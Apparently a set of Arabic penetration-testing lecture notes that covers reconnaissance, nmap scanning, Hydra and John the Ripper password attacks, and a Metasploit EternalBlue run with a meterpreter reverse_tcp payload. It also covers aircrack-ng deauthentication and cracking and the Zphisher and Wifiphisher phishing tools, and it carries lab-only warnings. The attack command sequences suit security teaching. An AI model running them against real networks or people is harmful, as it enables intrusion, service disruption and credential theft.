المحاضرة الثانية: جمع المعلومات

تعتبر مرحلة جمع المعلومات حجر الزاوية في أي عملية اختبار اختراق. كلما زادت المعلومات التي تجمعها عن الهدف، زادت فرص نجاحك في العثور على ثغرات أمنية. تنقسم هذه المرحلة إلى جمع المعلومات السلبي (لا يوجد تفاعل مباشر مع الهدف) والنشط (تفاعل مباشر).

أدوات جمع المعلومات الأساسية

  • Whois: أداة للاستعلام عن معلومات تسجيل أسماء النطاقات، مثل المالك وجهة التسجيل وتواريخ الإنشاء والانتهاء
  • nslookup & dig: أدوات للاستعلام عن سجلات DNS الخاصة بالنطاق، مثل عنوان IP وسجلات البريد
  • theHarvester: أداة قوية تجمع البريد الإلكتروني وأسماء الموظفين والنطاقات الفرعية من مصادر عامة
  • Recon-ng: إطار عمل متكامل لجمع المعلومات يشبه Metasploit
  • Maltego: أداة رسومية قوية لتحليل الروابط وجمع المعلومات من مصادر مفتوحة

مثال عملي باستخدام theHarvester

theharvester -d example.com -l 500 -b google

هذا الأمر يبحث في Google عن أول 500 نتيجة متعلقة بالنطاق example.com ويستخرج أي معلومات متاحة.

المحاضرة الثالثة: فحص الشبكات واكتشاف الثغرات

تعتبر أدوات فحص الشبكات ضرورية لاكتشاف الأجهزة المضيفة والمنافذ المفتوحة والخدمات وأنظمة التشغيل، مما يساعد في تحديد نقاط الضعف المحتملة.

1. Nmap (Network Mapper)

Nmap هي أداة مفتوحة المصدر قوية ومتعددة الاستخدامات تُستخدم لاكتشاف الشبكات وفحص المنافذ وتدقيق الأمن. تُعتبر الأداة الأساسية لأي مختبر اختراق.

استخدامات Nmap الشائعة:

  • مسح Ping (-sn): لاكتشاف الأجهزة المضيفة النشطة في الشبكة
  • مسح المنافذ (افتراضي): يقوم بمسح 1000 منفذ الأكثر شيوعاً
  • مسح منافذ محددة (-p): لمسح منافذ معينة فقط
  • اكتشاف نظام التشغيل (-O): لتخمين نظام التشغيل المستهدف
  • اكتشاف إصدار الخدمة (-sV): لتحديد إصدارات الخدمات
# مسح الأجهزة النشطة nmap -sn 192.168.1.0/24 # مسح شامل nmap -A 192.168.1.1 # مسح SYN الخفي nmap -sS 192.168.1.1

2. Netdiscover

Netdiscover هي أداة سريعة لاكتشاف الشبكة تعتمد على بروتوكول ARP، ممتازة لتحديد الأجهزة المضيفة النشطة في الشبكة المحلية.

# المسح التلقائي sudo netdiscover # مسح في نطاق محدد sudo netdiscover -r 192.168.1.0/24 # الوضع السلبي sudo netdiscover -p

3. Enum4linux

Enum4linux هي أداة لينكس تُستخدم لجمع المعلومات من أنظمة Windows عبر بروتوكول SMB. تُستخدم بشكل شائع في اختبارات الاختراق لعد المستخدمين والمجموعات والمجلدات المشتركة.

4. snmpwalk

snmpwalk هي أداة سطر أوامر تُستخدم للاستعلام واسترداد المعلومات من الأجهزة باستخدام بروتوكول SNMP. تقوم بـ "المشي" عبر جزء من شجرة MIB للحصول على بيانات منظمة من جهاز بعيد.

# الصيغة الأساسية snmpwalk -v 2c -c public 192.168.1.1 # معرفات الكائنات المفيدة # وصف النظام: 1.3.6.1.2.1.1.1.0 # معلومات الاتصال: 1.3.6.1.2.1.1.4.0 # العمليات الجارية: 1.3.6.1.2.1.25.4.2.1.2

المحاضرة الرابعة: أدوات الهجوم على كلمات المرور

تُعد أدوات الهجوم على كلمات المرور جزءاً أساسياً من اختبار الاختراق، حيث تهدف إلى اكتشاف كلمات المرور الضعيفة أو المخترقة في الأنظمة والخدمات المختلفة.

1. Hydra - أداة الهجوم عبر الإنترنت

تُعتبر Hydra من أقوى الأدوات في مجال اختبار الاختراق، وتُستخدم على نطاق واسع في عملية اختبار قوة كلمات المرور على مختلف الخدمات والبروتوكولات الشبكية.

البروتوكولات المدعومة:

  • SSH (Secure Shell): لتسجيل الدخول عن بعد
  • FTP (File Transfer Protocol): لنقل الملفات
  • HTTP/HTTPS: للمصادقة على صفحات الويب
  • Telnet: للوصول عن بعد إلى الأجهزة
  • RDP: للتحكم عن بعد في أجهزة الكمبيوتر
  • MySQL, PostgreSQL: لقواعد البيانات

مثال عملي: اختبار أمان خادم SSH

# هجوم قاموس على SSH hydra -l root -P passwords.txt ssh://192.168.1.100 # هجوم بقائمة مستخدمين وكلمات مرور hydra -L users.txt -P passwords.txt ssh://192.168.1.100 # تحديد عدد الخيوط المتوازية hydra -l admin -P rockyou.txt -t 4 ssh://192.168.1.100

2. John the Ripper - أداة الهجوم دون اتصال

John the Ripper هي أداة قوية لاختراق كلمات المرور دون اتصال بالإنترنت. تُستخدم بشكل أساسي لاكتشاف كلمات المرور الضعيفة في أنظمة التشغيل المختلفة.

أنواع الهجمات:

  • هجوم القاموس: تجرب كلمات مرور من قائمة معدة مسبقاً
  • هجوم القوة الغاشمة: تجرب جميع التركيبات الممكنة
  • هجوم القواعد: تطبق قواعد معينة على كلمات القاموس
# تثبيت John the Ripper sudo apt install john # فك تشفير ملف محمي بكلمة مرور python3 office2john.py document.xlsx > hash.txt john --wordlist=rockyou.txt hash.txt # عرض كلمات المرور المكتشفة john --show hash.txt
نصيحة أمنية

استخدام كلمات مرور قوية وفريدة لكل حساب يقلل بشكل كبير من خطر نجاح هجمات القاموس والقوة الغاشمة. كما أن تفعيل المصادقة الثنائية (2FA) يضيف طبقة حماية إضافية.

المحاضرة الخامسة: إطار عمل Metasploit

Metasploit Framework هو إطار عمل مفتوح المصدر لاختبار الاختراق، يُستخدم لتطوير واختبار وتنفيذ الاستغلالات ضد الأنظمة الضعيفة. إنه مجموعة شاملة من الأدوات التي تسمح للمستخدمين باستغلال الثغرات الأمنية بطريقة منظمة وفعالة.

المكونات الرئيسية

  • الاستغلالات (Exploits): وحدات برمجية مصممة للاستفادة من ثغرة أمنية محددة
  • الحمولات (Payloads): الكود الذي يتم تنفيذه على النظام المستهدف بعد نجاح الاستغلال
  • الوحدات المساعدة (Auxiliary): أدوات تساعد في جمع المعلومات أو مهام أخرى
  • المشفرات (Encoders): تُستخدم لتشفير الحمولات لتجنب الاكتشاف

أقسام واجهة Metasploit

  • RECON (أزرق): للاستطلاع وجمع المعلومات قبل الاستغلال
  • EXPLOIT (أخضر): لاستغلال الثغرات باستخدام وحدات الاستغلال المتاحة
  • PAYLOAD (أحمر): الكود الضار الذي يتم حقنه في الهدف
  • LOOT (أصفر): البيانات التي تم جمعها بعد الاستغلال

مثال عملي: استغلال MS17-010 (EternalBlue)

هذا المثال يوضح كيفية استغلال ثغرة EternalBlue الشهيرة التي كانت مسؤولة عن هجوم WannaCry.

# تشغيل Metasploit msfconsole # البحث عن الاستغلال search ms17_010 # اختيار الاستغلال use exploit/windows/smb/ms17_010_eternalblue # عرض الخيارات show options # تعيين IP الهدف set RHOSTS 192.168.20.206 # تعيين الحمولة set PAYLOAD windows/x64/meterpreter/reverse_tcp # تعيين IP المهاجم set LHOST 192.168.20.248 # تشغيل الاستغلال exploit
ملاحظة هامة

ثغرة EternalBlue خطيرة جداً، وهذا المثال لأغراض تعليمية فقط ويجب استخدامه في بيئات معملية خاضعة للتحكم.

المحاضرة السادسة: أساسيات أمن المعلومات

أمن المعلومات هو حماية المعلومات وأنظمة المعلومات من الوصول غير المصرح به والاستخدام والكشف والتعديل والتدمير أو التعطيل. يرتكز أمن المعلومات على ثلاثة مبادئ أساسية تُعرف باسم مثلث CIA.

مثلث CIA

  • السرية (Confidentiality): ضمان أن المعلومات لا يمكن الوصول إليها إلا من قبل الأشخاص المصرح لهم
  • التكامل (Integrity): ضمان دقة واكتمال المعلومات وطرق معالجتها ومنع التعديل غير المصرح به
  • التوفر (Availability): ضمان أن المستخدمين المصرح لهم يمكنهم الوصول إلى المعلومات والأنظمة عند الحاجة

أنواع الضوابط الأمنية

  • الضوابط الإدارية: السياسات والإجراءات التي تحكم سلوك المستخدمين والموظفين
  • الضوابط التقنية: استخدام التكنولوجيا لحماية المعلومات مثل جدران الحماية والتشفير
  • الضوابط المادية: الإجراءات المادية لحماية الأصول مثل الأقفال والكاميرات

تصنيفات الحماية حسب الوظيفة

  • الضوابط الوقائية: تهدف إلى منع وقوع الهجمات
  • الضوابط الكشفية: تهدف إلى اكتشاف الهجمات فور وقوعها
  • الضوابط التصحيحية: تهدف إلى استعادة الأنظمة بعد وقوع الهجوم
نصيحة أمنية

فهم مبادئ أمن المعلومات وتطبيق الضوابط الأمنية المناسبة هو حجر الزاوية في بناء بيئة رقمية آمنة. الأمان الفعال يتطلب نهجاً متعدد الطبقات يجمع بين الضوابط الإدارية والتقنية والمادية.

المحاضرة السابعة: أدوات اختراق الشبكات اللاسلكية

تُستخدم أدوات اختراق الشبكات اللاسلكية لتقييم أمان الشبكات اللاسلكية واكتشاف الثغرات فيها. هذه الأدوات تساعد في أتمتة وتسريع عملية اكتشاف الثغرات وتُستخدم من قبل خبراء الأمن لتقييم نقاط الضعف.

الأدوات الرئيسية

  • Aircrack-ng: مجموعة شاملة من الأدوات لتقييم أمان شبكات Wi-Fi
  • Wireshark: محلل بروتوكولات الشبكة
  • Kismet: أداة اكتشاف وتحليل الشبكات اللاسلكية
  • Reaver: أداة متخصصة في استغلال ثغرة WPS
  • Wifite: سكريبت مؤتمت لتبسيط هجمات Wi-Fi
  • Wifiphisher: أداة التصيد الاحتيالي للشبكات اللاسلكية

1. Aircrack-ng

Aircrack-ng هي مجموعة متكاملة من الأدوات مفتوحة المصدر تُستخدم لتقييم أمان شبكات Wi-Fi. تُعتبر من الأدوات الأساسية في مجال اختبار الاختراق الأخلاقي للشبكات اللاسلكية.

مكونات Aircrack-ng الرئيسية:

  • airmon-ng: تفعيل وتعطيل وضع المراقبة على بطاقة الشبكة اللاسلكية
  • airodump-ng: مسح الشبكات اللاسلكية وجمع المعلومات والتقاط المصافحة
  • aireplay-ng: حقن الحزم وتنفيذ هجمات قطع الاتصال
  • aircrack-ng: كسر مفاتيح التشفير WEP/WPA/WPA2
# تفعيل وضع المراقبة sudo airmon-ng start wlan0 # مسح الشبكات والتقاط البيانات sudo airodump-ng --bssid [BSSID] -c [CHANNEL] -w [FILENAME] wlan0mon # هجوم قطع الاتصال sudo aireplay-ng --deauth 0 -a [BSSID] -c [CLIENT_MAC] wlan0mon # كسر كلمة المرور aircrack-ng -w [WORDLIST] -b [BSSID] [FILENAME].cap

2. Wireshark

Wireshark هو محلل بروتوكولات شبكة يُعتبر المعيار الذهبي في هذا المجال. يسمح بالتقاط حركة المرور على الشبكة وعرضها بتفاصيل دقيقة وسهلة القراءة.

3. Kismet

Kismet هي أداة قوية ومتقدمة تُستخدم لاكتشاف وتحليل الشبكات اللاسلكية وتحديد التهديدات الأمنية. تتفوق في الاستطلاع السلبي وتعمل دون إرسال أي حزم.

مميزات Kismet:

  • المسح السلبي: تستمع فقط دون إرسال حزم
  • اكتشاف الشبكات المخفية (Hidden SSIDs)
  • هندسة العميل/الخادم مع واجهة ويب حديثة
  • دعم مصادر متعددة (Wi-Fi, Bluetooth, SDR)
  • تحديد الموقع الجغرافي مع GPS
  • نظام تنبيهات متقدم لاكتشاف التسلل
ملاحظة هامة

جميع هذه الأدوات يجب استخدامها فقط في بيئات مخبرية أو على شبكات تملك الإذن الصريح لاختبارها. الاستخدام غير المصرح به لهذه الأدوات قد يكون غير قانوني ويمكن أن يؤدي إلى عواقب قانونية خطيرة.

المحاضرة الثامنة: الهندسة الاجتماعية

تُعد الهندسة الاجتماعية من أبرز الأساليب المستخدمة في مجال أمن المعلومات، حيث تعتمد على الخداع البشري والتلاعب النفسي بدلاً من الاعتماد المباشر على الثغرات التقنية.

أدوات الهندسة الاجتماعية الشائعة

تتضمن أدوات الهندسة الاجتماعية منصات مخصصة لتصميم هجمات التصيد الاحتيالي أو انتحال الهوية. هذه الأدوات لا تعتمد على تخمين كلمة المرور، بل على خداع المستخدمين وجعلهم يسلمون كلمة المرور بأنفسهم.

1. Zphisher

Zphisher هي أداة مفتوحة المصدر مطورة لتسهيل هجمات التصيد الاحتيالي. توفر أكثر من 30 قالباً جاهزاً لخدمات شهيرة مثل Facebook وInstagram وGmail وNetflix وPayPal وصفحات تسجيل الدخول لشبكات Wi-Fi.

مميزات Zphisher:

  • سهولة التشغيل على Kali وUbuntu وTermux
  • توفر قوالب جاهزة لصفحات تسجيل الدخول
  • تدعم Port Forwarding عبر Ngrok وServeo وLocalHostRun
  • تحفظ المدخلات في ملفات Logs داخل الأداة
# تثبيت Zphisher sudo apt update sudo apt install git curl php -y git clone https://github.com/htr-tech/zphisher cd zphisher # تشغيل الأداة sudo ./zphisher.sh

2. Wifiphisher

Wifiphisher هي أداة أمنية تقوم بأتمتة هجمات التصيد الاحتيالي ضد شبكات Wi-Fi. تهدف إلى الحصول على بيانات الاعتماد عن طريق خداع المستخدمين.

آلية عمل Wifiphisher:

  • قطع الاتصال: فصل جميع المستخدمين المتصلين بالشبكة المستهدفة
  • إنشاء نقطة وصول مزيفة: إنشاء شبكة Wi-Fi وهمية بنفس اسم الشبكة الأصلية
  • توجيه لصفحة تصيد: توجيه المستخدم إلى صفحة ويب مزيفة تشبه إعدادات الراوتر
  • الحصول على كلمة المرور: طلب كلمة المرور بحجة تحديث البرنامج الثابت
# تثبيت Wifiphisher sudo apt update sudo apt install wifiphisher # أو من المصدر git clone https://github.com/wifiphisher/wifiphisher.git cd wifiphisher sudo python3 setup.py install # تشغيل الأداة sudo wifiphisher

كيفية الاستخدام:

  • تشغيل الأداة وانتظار مسح الشبكات
  • اختيار الشبكة المستهدفة من القائمة
  • اختيار سيناريو الهجوم (مثل Firmware Upgrade)
  • بدء الهجوم وانتظار إدخال الضحية لكلمة المرور
  • عرض كلمة المرور في نافذة الطرفية عند إدخالها
ملاحظة هامة

الهندسة الاجتماعية هي أخطر أنواع الهجمات لأنها تستهدف العنصر البشري، والذي غالباً ما يكون أضعف حلقة في سلسلة الأمان. التوعية الأمنية هي أفضل دفاع ضد هذه الهجمات.
